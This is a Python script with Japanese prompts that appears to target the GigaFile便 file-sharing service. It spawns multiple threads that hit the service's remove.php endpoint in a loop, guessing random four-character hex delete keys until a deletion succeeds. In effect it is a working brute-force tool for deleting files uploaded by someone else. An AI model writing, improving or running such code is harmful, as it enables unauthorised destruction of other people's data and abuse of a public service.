import json
import random
import threading
import time
import urllib.parse
import urllib.request
from queue import Queue


def main():
    url = input("ギガファイル便のURLを入力してください: ")
    file_name = url.split("/")[-1]
    server_id = url.split("/")[2]

    thread_num = int(input("スレッド数を入力してください: "))

    password = generate_random_string(4)
    delete_url = f"https://{server_id}/remove.php?file={file_name}&delkey={password}"

    threads = []
    task_queue = Queue()

    for _ in range(thread_num):
        t = threading.Thread(target=delete_file, args=(task_queue, delete_url, file_name))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()


def delete_file(task_queue, delete_url, file_name):
    while True:
        try:
            response = urllib.request.urlopen(delete_url)
            result = json.loads(response.read())
        except Exception as e:
            print(e)
            print("エラーが発生しました")
            time.sleep(5)
            continue

        if result["status"] == 0:
            print("削除に成功しました")
            break
        else:
            password = generate_random_string(4)
            delete_url = f"{delete_url.split('&')[0]}&delkey={password}"
            task_queue.put(delete_url)
            print(f"パスワード{password}が間違っています")
            task_queue.task_done()


def generate_random_string(length):
    char_set = "abcdef1234567890"
    return ''.join(random.choice(char_set) for _ in range(length))


if __name__ == "__main__":
    main()
